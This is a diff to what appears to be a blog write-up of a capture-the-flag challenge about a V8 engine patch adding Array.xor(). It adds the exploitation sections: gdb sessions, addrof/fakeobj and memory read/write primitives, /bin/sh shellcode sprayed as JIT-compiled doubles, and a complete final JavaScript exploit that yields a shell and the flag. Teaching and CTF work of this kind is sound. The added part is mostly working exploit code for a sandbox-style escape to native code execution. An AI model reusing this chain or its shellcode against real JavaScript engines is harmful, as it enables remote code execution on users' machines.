@@ -318,6 +318,27 @@ The patch adds a new **Array.xor()** prototype that can be used to xor all value
 .termCodeComm {
 	color: var(--lyreGold);
 }
+.termCodeFlag {
+	display: inline-block;
+	color: #FFF;
+	transform: scale(1);
+	text-shadow: 0 0 8px #f440;
+	transition: transform 0.6s, text-shadow 0.5s, background 0.5s;
+	background: linear-gradient(90deg, #fa0 0%, #f0d 50%, #80f 100%);
+	font-weight: bold;
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent; 
+  -moz-background-clip: text;
+  -moz-text-fill-color: transparent;
+  background-size: 200%;
+  background-position: 100%;
+  cursor: grabbing;
+}
+.termCodeFlag:hover {
+	transform: scale(1.2);
+	text-shadow: 0 0 8px #f44f;
+	background-position: 0%;
+}
 </style>
 
 Quite the peculiar feature. It may seem a little confusing if you aren't familiar with [IEEE 754](https://en.wikipedia.org/wiki/IEEE_754) [doubles](https://en.wikipedia.org/wiki/Double-precision_floating-point_format), but it makes sense once we look at the hex representations of the values:
@@ -1149,7 +1170,7 @@ Awesome, we have a code object that points to an address where the code gets run
 > codeAddr = read(funcAddr + 0x8n) >> 32n
 > hex32(codeAddr)
 < '0x002006ed'
-> instructionStart = codeAddr + 0x12n
+> instructionStart = codeAddr + 0x14n
 > hex64(read(instructionStart))
 < '0x00005555b7941700'
 > instructions = [i2f(0xCCCCCCCCCCCCCCCCn), 2.2]
@@ -1157,13 +1178,13 @@ Awesome, we have a code object that points to an address where the code gets run
 < [-9.255963134931783e+61, 2.2]
 > write(instructionStart, 0x2d7a00000000n + addrof(instructions) - 0x10n);
 > func()
-Received signal 11 SEGV_MAPERR 00002d7a0004
+Received signal 11 SEGV_ACCERR 2d7a00050061
 Segmentation fault (core dumped)
 ```
 
 Huh, that didn't work, why is that?
 
-The `SEGV_MAPERR` signal gives us a hint - it means that there was some sort of an error accessing the memory. It turns out not all memory is made equal and different parts of the memory have different permissions. In Linux we can see this by looking at the map of a process.
+The `SEGV_ACCERR` signal gives us a hint - it means that there was some sort of a permissions error accessing the memory map. It turns out not all memory is made equal and different parts of the memory have different permissions. In Linux we can see this by looking at the map of a process.
 
 <div class="termCode"><span class="termCodeW">$ ./d8 &amp;</span> <span class="termCodeComm">&lt;-- run d8 in the background</span>
 [1] 1962 <span class="termCodeComm">&lt;-- that's the d8 process id</span>
@@ -1249,8 +1270,6 @@ a6b00000000-1a6b00010000 <span class="termCodePr">r--p</span> <span class="over8
 ffffffffff600000-ffffffffff601000 <span class="termCodePx">--xp</span> <span class="over800">00000000 00:00 0                 </span>&nbsp;[vsyscall]
 <span class="termCodeW">$</span></div>
 
-These are all the memory addresses d8 uses, and each one of them has permissions associated with them - **r**ead, **w**rite, and e**x**ecute respectively. The array we made is in one of the read-write maps, so trying to execute code from there is going to result in a crash.
-
 <style>
 .termCodePp {
 	color: #444;
@@ -1269,12 +1288,323 @@ These are all the memory addresses d8 uses, and each one of them has permissions
 }
 </style>
 
-I then found [this awesome writeup by Anvbis](https://anvbis.au/posts/code-execution-in-chromiums-v8-heap-sandbox/) showing off how we can use Turbofan to get code execution. I'll be borrowing heavily from that post, but it goes a lot more in-depth so please check it out if you're interested in this technique.
+These are all the memory addresses d8 uses, and each one of them has permissions associated with them - **r**ead, **w**rite, and e**x**ecute respectively. The array we made is in one of the read-write maps, so trying to execute code from there is going to result in a crash.
 
-Okay, let's try to figure out 
+But how are we going to write data into that one memory map that has the **rwx** permissions? We cannot use our write primitive because it can only write into the lower 32 bits our compressed pointer can access.
 
-## Part 5: What could've been
-## Part 6: The end
+I then came across [this awesome writeup by Anvbis](https://anvbis.au/posts/code-execution-in-chromiums-v8-heap-sandbox/) demonstrating how we can use Turbofan to do exactly that through a very clever trick. I'll be borrowing heavily from that post, but it goes a lot more in-depth so please check it out if this sounds interesting.
+
+What Anvbis did was create a function with doubles in it, and those doubles got Turbofan-optimized into bytes in the **rwx** area. They could then offset the instruction start pointer to start execution from those doubles instead of the original code.
+
+Let's see if we can trigger an INT3 breakpoint this way.
+
+```js
+> i2f(0xCCCCCCCCCCCCCCCCn)
+< -9.255963134931783e+61
+> function int3() {
+	return [ // i changed every line a little so that the numbers wouldn't get optimized into one
+		-9.255963134931783e+61,
+		-9.255963134931784e+61,
+		-9.255963134931785e+61,
+		-9.255963134931786e+61,
+		-9.255963134931787e+61,
+		-9.255963134931788e+61,
+		-9.255963134931789e+61,
+		-9.255963134931780e+61,
+	]
+}
+> int3()
+> %PrepareFunctionForOptimization(int3)
+> int3()
+> %OptimizeFunctionOnNextCall(int3)
+> int3()
+> funcAddr = addrof(int3)
+> codeAddr = read(funcAddr + 0x8n) >> 32n
+> instructionStart = codeAddr + 0x14n
+> hex64(read(instructionStart))
+< '0x00005555b7941b00'
+> ^Z
+Thread 1 "d8" received signal SIGTSTP, Stopped (user).
+(gdb) x/32xg 0x00005555b7941b00
+0x5555b7941b00: 0x43f6de0349f4598b 0xa0035af0850f201e
+0x5555b7941b10: 0x48505756e5894855 0x0fa0653b4908ec83
+0x5555b7941b20: 0x4d8b490000010186 0x7d394958798d4848
+0x5555b7941b30: 0x480000011f860f50 0x48487d894948798d
+0x5555b7941b40: 0x08a9ff41c701c183 0x0000100341c70000
+0x5555b7941b50: 0xccccccccccba4900 0xc26ef9c1c4cccccc
+0x5555b7941b60: 0xcdba49074111fbc5 0xc4cccccccccccccc
+0x5555b7941b70: 0x4111fbc5c26ef9c1 0xccccccccceba490f
+0x5555b7941b80: 0xc26ef9c1c4cccccc 0xcfba49174111fbc5
+0x5555b7941b90: 0xc4cccccccccccccc 0x4111fbc5c26ef9c1
+0x5555b7941ba0: 0xba49274111fbc51f 0xccccccccccccccd0
+0x5555b7941bb0: 0x11fbc5c26ef9c1c4 0xccccccd1ba492f41
+0x5555b7941bc0: 0x6ef9c1c4cccccccc 0xba49374111fbc5c2
+0x5555b7941bd0: 0xccccccccccccccc9 0x11fbc5c26ef9c1c4
+0x5555b7941be0: 0x894d10478d4c3f41 0xb84101c783484845
+0x5555b7941bf0: 0xff478944001cb7c5 0x89000007250347c7
+(gdb) c
+Continuing.
+> write(instructionStart, read(instructionStart) + 0x53n);
+> int3()
+Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
+0x00005555b7941b36 in ?? ()
+(gdb)
+```
+
+Perfect! We found the place in the rwx memory our 0xCC instruction got put in, and then successfully redirected the execution to that point. The only problem is that our doubles in the memory are not directly one after another - there's some other instructions in-between and we must deal with it somehow.
+
+The solution to that is creating some very special shellcode that carefully jumps from one double to the next in a way where our code is the only code getting executed. [Anvbis' writeup](https://anvbis.au/posts/code-execution-in-chromiums-v8-heap-sandbox/) does a way better job of explaining this than I ever could, so go check it out!
+
+```js
+> function shellcode() {
+  return [ // `/bin/sh` shellcode nabbed from that Anvbis writeup
+    1.9711828979523134e-246,
+    1.9562205631094693e-246,
+    1.9557819155246427e-246,
+    1.9711824228871598e-246,
+    1.971182639857203e-246,
+    1.9711829003383248e-246,
+    1.9895153920223886e-246,
+    1.971182898881177e-246
+  ]
+}
+> shellcode();
+> %PrepareFunctionForOptimization(shellcode);
+> shellcode();
+> %OptimizeFunctionOnNextCall(shellcode);
+> shellcode();
+> funcAddr = addrof(shellcode)
+> codeAddr = read(funcAddr + 0x8n) >> 32n
+> instructionStart = codeAddr + 0x14n
+> write(instructionStart, read(instructionStart) + 0x53n);
+> shellcode();
+lyra@horse:~$ whoami
+lyra
+lyra@horse:~$ fortune
+Flee at once, all is discovered.
+lyra@horse:~$
+```
+We got shell!!! We're almost there except...
+
+## Part 5: Please don't collect the garbage
+
+We're still reliant on the **%PrepareFunctionForOptimization()** and **%OptimizeFunctionOnNextCall()** debug functions. We can't use them in the actual CTF, so let's try to replace them.
+
+We want to somehow tell V8 to optimize our function with Turbofan, and the easiest way to accomplish that is to just run our function a lot of times, let's give it a shot!
+
+```js
+> for (let i = 0; i < 10000; i++) shellcode();
+> %DebugPrint(shellcode)
+DebugPrint: 0x128c001d3e95: [Function] in OldSpace
+ - code: 0x128c00032cc1 <Code BUILTIN InterpreterEntryTrampoline>
+> for (let i = 0; i < 100000; i++) shellcode();
+> %DebugPrint(shellcode)
+DebugPrint: 0x128c001d3e95: [Function] in OldSpace
+ - code: 0x128c0020051d <Code MAGLEV>
+> for (let i = 0; i < 1000000; i++) shellcode();
+> %DebugPrint(shellcode)
+DebugPrint: 0x128c001d3e95: [Function] in OldSpace
+ - code: 0x128c00200ad9 <Code TURBOFAN>
+```
+
+Yay, we got our Turbofan code without having to use the debug function stuff! Now let's try running the exploit again.
+
+<div class="termCode"><span class="termCodeW">$ gdb --args ./d8 exploit.js</span>
+GNU gdb (GDB) 14.2
+<span class="termCodeW">(gdb) run</span>
+[Thread 0x7ffff74986c0 (LWP 3563) exited]
+[Thread 0x7ffff6c976c0 (LWP 3564) exited]
+[Thread 0x7ffff7c996c0 (LWP 3562) exited]
+[Inferior 1 (process 3559) exited normally]
+<span class="termCodeW">(gdb)</span></div>
+
+huh... that didn't work?
+
+Let's try again with some debug logging and the `--trace-gc` flag added.
+
+<div class="termCode"><span class="termCodeW">$ gdb --args ./d8 --trace-gc --allow-natives-syntax exploit.js</span>
+GNU gdb (GDB) 14.2
+<span class="termCodeW">(gdb) run</span>
+Optimizing shellcode() into TURBOFAN
+[3735:0x555557e0a000]       61 ms: Scavenge 1.1 (1.8) -> 0.1 (2.8) MB, pooled: 0 MB, 14.69 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
+[3735:0x555557e0a000]       79 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 16.18 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
+[3735:0x555557e0a000]       96 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 16.78 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
+[3735:0x555557e0a000]      111 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 14.87 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
+[3735:0x555557e0a000]      123 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 11.77 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
+[3735:0x555557e0a000]      136 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 12.39 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
+[3735:0x555557e0a000]      155 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 18.08 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
+[3735:0x555557e0a000]      177 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 9.98 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
+[3735:0x555557e0a000]      185 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 7.04 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
+[3735:0x555557e0a000]      191 ms: Scavenge 1.1 (3.0) -> 0.1 (3.0) MB, pooled: 0 MB, 6.31 / 0.00 ms  (average mu = 1.000, current mu = 1.000) allocation failure; 
+DebugPrint: 0x298a001d4011: [Function] in OldSpace
+ - code: 0x39bb002005e5 &lt;Code TURBOFAN&gt;
+funcAddr: 0x00043999
+codeAddr: 0x00000725
+instructionStart: 0x00000725
+Writing shellcode
+Running shellcode
+[Thread 0x7ffff74986c0 (LWP 3739) exited]
+[Thread 0x7ffff6c976c0 (LWP 3740) exited]
+[Thread 0x7ffff7c996c0 (LWP 3738) exited]
+[Inferior 1 (process 3735) exited normally]
+<span class="termCodeW">(gdb)</span></div>
+
+Hmm, so our code gets optimized into Turbofan just fine, but the funcAddr is all wrong! It seems like the *for loop* causes the garbage collector to run, and what the garbage collector does it look at all the stuff in the memory and rearrange it to look nicer. More specifically, [it identifies objects no longer in use, removes them, and also defragments the memory](https://v8.dev/blog/trash-talk).
+
+What this means for us is that it takes our cool oob array and all the other stuff we've set up and throws it all over the place! Our primitives no longer work. In my original exploit at the CTF I fought hard against the GC and eventually found a setup that worked regardless, but it was a bit unreliable. Wouldn't it be nice if we could somehow optimize our function without causing a GC?
+
+I wasn't able to find a way to do this with Turbofan, but perhaps we could try out that Maglev thing we ignored earlier? It's output is a bit different, so we'll have to change our offsets, but it should still work the same.
+
+With that added, **we have our final exploit code**.
+
+```js
+// set up helper stuff
+const buffer = new ArrayBuffer(8);
+const floatBuffer = new Float64Array(buffer);
+const int64Buffer = new BigUint64Array(buffer);
+
+// bigint to double
+function i2f(i) {
+  int64Buffer[0] = i;
+  return floatBuffer[0];
+}
+
+// double to bigint
+function f2i(f) {
+  floatBuffer[0] = f;
+  return int64Buffer[0];
+}
+
+// bigint to 32-bit hex string
+function hex32(i) {
+  return "0x" + i.toString(16).padStart(8, 0);
+}
+
+// bigint to 64-bit hex string
+function hex64(i) {
+  return "0x" + i.toString(16).padStart(16, 0);
+}
+
+// set up variables
+const arr = [1.1, 2.2, 3.3];
+const tmpObj = {a: 1};
+const objArr = [tmpObj];
+
+// nabbed from Popax21
+function obj2ptr(obj) {
+    var arr = [13.37];
+
+    arr.xor({
+        valueOf: function() {
+            arr[0] = {}; //Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS
+            arr[0] = obj;
+            return 1; //Clear the lowest bit -> compressed SMI
+        } 
+    });
+    
+    return (arr[0] << 1) | 1;
+}
+
+// set up the fake array
+const arrAddr = BigInt(obj2ptr(arr));
+const arrElementsAddr = arrAddr - 0x20n;
+const fakeAddr = arrElementsAddr + 0x10n;
+const fakeElementsAddr = arrElementsAddr + 0x8n;
+arr[0] = i2f(0x00000100000008a9n);
+arr[1] = i2f(0x00000725001cb7c5n);
+arr[2] = i2f(0x0000010000000000n + fakeElementsAddr);
+
+// do the exploit
+const tmp = [1.1];
+const evil = {
+  valueOf: () => {
+    tmp[0] = arr;
+    return Number(arrAddr ^ fakeAddr);
+  }
+};
+tmp.xor(evil);
+
+// this is the fake 128-element array
+const oob = tmp[0];
+
+// set up addrof/fakeobj primitives
+function addrof(o) {
+    objArr[0] = o;
+    return f2i(oob[10]) >> 32n;
+}
+
+function fakeobj(a) {
+  const temp = f2i(oob[10]) & 0xFFFFFFFFn;
+  oob[10] = i2f(temp + (a << 32n));
+  return objArr[0];
+}
+
+// set up read/write primitives
+function read(addr) {
+  const readArr = [1.1, 2.2];
+  readArr[0] = i2f(0x00000725001cb7c5n);
+  readArr[1] = i2f(0x0000000200000000n + addr - 0x8n);
+  return f2i(fakeobj(addrof(readArr) - 0x10n)[0]);
+}
+
+function write(addr, data) {
+  const writeArr = [1.1, 2.2];
+  writeArr[0] = i2f(0x00000725001cb7c5n);
+  writeArr[1] = i2f(0x0000000200000000n + addr - 0x8n);
+  const fakeArr = fakeobj(addrof(writeArr) - 0x10n);
+  fakeArr[0] = i2f(data);
+}
+
+// set up the shellcode function
+function shellcode() {
+  // nabbed from Anvbis
+  return [
+    1.9711828979523134e-246,
+    1.9562205631094693e-246,
+    1.9557819155246427e-246,
+    1.9711824228871598e-246,
+    1.971182639857203e-246,
+    1.9711829003383248e-246,
+    1.9895153920223886e-246,
+    1.971182898881177e-246
+  ]
+}
+
+// turn the shellcode into maglev
+for (let i = 0; i < 10000; i++) {
+  shellcode();
+}
+
+// redirect the function start to our shellcode
+funcAddr = addrof(shellcode)
+codeAddr = read(funcAddr + 0x8n) >> 32n
+instructionStart = codeAddr + 0x14n
+write(instructionStart, read(instructionStart) + 0x7fn);
+shellcode();
+```
+
+**Let's get the flag!**
+
+
+<div class="termCode"><span class="termCodeW">$ nc arrayxor.challs.open.ecsc2024.it 38020</span>
+Do Hashcash for 24 bits with resource "k2v9WzPBJK2N"
+https://pow.cybersecnatlab.it/?data=k2v9WzPBJK2N&bits=24
+or
+hashcash -mCb24 "k2v9WzPBJK2N"
+Result: <span class="termCodeW">1:24:240525:k2v9WzPBJK2N::KmFvCdJ0h09D4MEm:00002QUYY</span>
+Send me your js exploit b64-encoded followed by a newline
+<span class="termCodeW">Ly8gc2V0IHVwIGhlbHBlciBzdHVmZgpjb25zdCBidWZmZXIgPSBuZXcgQXJyYXl...
+cat flag
+;</span>
+<span class="termCodeFlag">openECSC{t00_e5zy_w1th0ut_s4nb0x_gg_wp_5ec4376e}</span></div>
+
+gg.
+
+## Part 6: What could've been
+
+
+
+## Part 7: The end
 
 <style>
 .jsMem {
